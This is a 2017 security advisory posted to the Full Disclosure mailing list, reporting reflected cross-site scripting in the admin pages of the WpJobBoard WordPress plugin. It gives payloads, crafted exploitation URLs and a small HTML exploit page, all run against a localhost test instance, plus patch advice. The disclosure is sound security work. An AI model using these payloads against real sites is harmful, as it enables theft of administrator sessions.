
Date: Mon, 4 Sep 2017 11:58:14 +0200
From: Vulnerability Lab <research@...nerability-lab.com>
To: fulldisclosure@...lists.org
Subject: [FD] WpJobBoard v4.5.1 - Multiple Cross Site Web Vulnerabilities

Document Title:
===============
WpJobBoard v4.5.1 - Multiple Cross  Site Web Vulnerabilities


References (Source):
====================
https://www.vulnerability-lab.com/get_content.php?id=1941


Release Date:
=============
2017-08-18


Vulnerability Laboratory ID (VL-ID):
====================================
1941


Common Vulnerability Scoring System:
====================================
3.6


Vulnerability Class:
====================
Cross Site Scripting - Non Persistent


Current Estimated Price:
========================
500€ - 1.000€


Product & Service Introduction:
===============================
WPJobBoard is bundled with 15+ shortcodes, allowing you to easily build completely unique job board and insert additional 
features only when you need it and only where you see fit. WPJobBoard doesn’t limit your website to just a job board. 
Along with WPJB, you can still maintain a blog and take advantage of all the other features WordPress and its plugins 
and themes offer. You can keep your community and your blog, but you can add a professional job board.

(Copy of the Vendor Homepage: https://wpjobboard.net/features/ )


Abstract Advisory Information:
==============================
The vulnerability laboratory core research team discovered multiple client-side cross site web vulnerabilties in the WpJobBoard v4.5.1 web-application for wordpress.


Vulnerability Disclosure Timeline:
==================================
2017-08-18: Non-Public Disclosure (Vulnerability Laboratory - Shared Customer Research Feed)


Discovery Status:
=================
Published


Affected Product(s):
====================
WpJobBoard
Product: WPJobBoard - Wordpress Plugin (Web-Application) 4.4.4

WpJobBoard
Product: WPJobBoard - Wordpress Plugin (Web-Application) 4.5.1


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
Multiple client-side cross site scripting web vulnerabilities has been discovered in the official WpJobBoard v4.5.1 web-application for wordpress.
The client-side cross site vulnerability allows remote attackers to inject own malicious script codes to client-side browser to web-application.

The vulnerabilities are located in the `query` and `id` parameters of the `wpjb-email`, `wpjb-job`, `wpjb-application` and `wpjb-membership` modules.
Remote attackers are able to inject own malicious script code to hijack admin session credentials via backend or to manipulate the backend on client-side 
performed requests. The attack vector is non-persistent and the request method to inject is GET. The attacker does not need a privileged user account to 
perform the successful exploitation.

The security risk of the client-side cross site scripting vulnerabilities are estimated as medium with a cvss (common vulnerability scoring system) count of 3.6. 
Exploitation of the client-side cross site scripting web vulnerabilities requires no privileged web-application user account and only low user interaction. 
Successful exploitation of the vulnerability results in non-persistent phishing attacks, session hijacking, non-persistent external redirect to malicious sources 
and non-persistent manipulation of affected or connected web module context.

Request Method(s):
[+] GET

Vulnerable Module(s):
[+] `wpjb-email`
[+] `wpjb-job`
[+] `wpjb-application`
[+] `wpjb-membership`

Vulnerable Parameter(s):
[+] query
[+] id

Affected Module(s):
[+] Backend - Administrator & Moderators


Proof of Concept (PoC):
=======================
The client-side cross site scripting vulnerabilities can be exploited by remote attackers without privileged web-application user account and with low user interaction.
For security demonstration or to reproduce the web-application vulnerability follow the provided information and steps below to continue.


PoC: Payload
>"<iframe+src%3Da+onload%3Dalert(document.cookie)+<div style="1
>"<iframe+src%3Da+onload%3Dalert(document.domain)+<div style="1


PoC: Exploitation
http://wpjobboard.localhost:8080wp-admin/admin.php?page=wpjb-email&action=edit&id=-1%27%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C
http://wpjobboard.localhost:8080wp-admin/admin.php?page=wpjb-job&filter=all&query=%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C
http://wpjobboard.localhost:8080wp-admin/admin.php?page=wpjb-application&action=index&query=%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C
http://wpjobboard.localhost:8080wp-admin/admin.php?page=wpjb-email&action=edit&id=%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C
http://wpjobboard.localhost:8080wp-admin/admin.php?page=wpjb-memberships&action=edit&id=%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C



PoC: Exploit Code
<html>
<head><body>
<title></title>
<iframe src=http://wpjobboard.localhost:8080/wp-admin/admin.php?page=wpjb-email&action=edit&id=-1%27%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C>
<iframe src=http://wpjobboard.localhost:8080/wp-admin/admin.php?page=wpjb-job&filter=all&query=%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C>
<iframe src=http://wpjobboard.localhost:8080/wp-admin/admin.php?page=wpjb-application&action=index&query=%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C>
<iframe src=http://wpjobboard.localhost:8080/wp-admin/admin.php?page=wpjb-email&action=edit&id=%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C>
<iframe src=http://wpjobboard.localhost:8080/wp-admin/admin.php?page=wpjb-memberships&action=edit&id=%3E%22%3Ciframe+src%3Da+onload%3Dalert%28document.cookie%29+%3C>
</body></head>
</html>


Reference(s):
http://wpjobboard.localhost:8080/
http://wpjobboard.localhost:8080/wp-admin/
http://wpjobboard.localhost:8080wp-admin/admin.php


Solution - Fix & Patch:
=======================
The cross site scripting vulnerability can be patched by a secure parse of the vulnerable `query` and `id` parameters.
Disallow the inseration of special chars on parameter requests to prevent client-side script code injection attacks to compromise session data.
Filter and parse the output location were the execution point occurs by usage of entities. Escape the context only in case of emergency.
Filter all inserted context that runs through the affected `wpjb-email`, `wpjb-application` and `wpjb-job` modules


Security Risk:
==============
The security risk of the client-side cross site scripting vulnerabilities in the admin control panel are estimated as medium. (CVSS 3.6)


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri [http://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.]


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or 
implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any 
case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability Labs or its 
suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for incidental
or consequential damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface 
websites, hack into databases or trade with stolen data. We have no need for criminal activities or membership requests. We do not publish advisories 
or vulnerabilities of religious-, militant- and racist- hacker/analyst/researcher groups or individuals. We do not publish trade researcher mails, 
phone numbers, conversations or anything else to journalists, investigative authorities or private individuals. 

Domains:    www.vulnerability-lab.com		- www.vulnerability-db.com					- www.evolution-sec.com
Programs:   vulnerability-lab.com/submit.php 	- vulnerability-lab.com/list-of-bug-bounty-programs.php 	- vulnerability-lab.com/register.php
Feeds:	    vulnerability-lab.com/rss/rss.php 	- vulnerability-lab.com/rss/rss_upcoming.php 			- vulnerability-lab.com/rss/rss_news.php
Social:	    twitter.com/vuln_lab		- facebook.com/VulnerabilityLab 				- youtube.com/user/vulnerability0lab

Any modified copy or reproduction, including partially usages, of this file, resources or information requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark 
of vulnerability-lab team & the specific authors or managers. To record, list, modify, use or edit our material contact (admin@) to get an ask permission.

				    Copyright © 2017 | Vulnerability Laboratory - [Evolution Security GmbH]™



-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com



_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/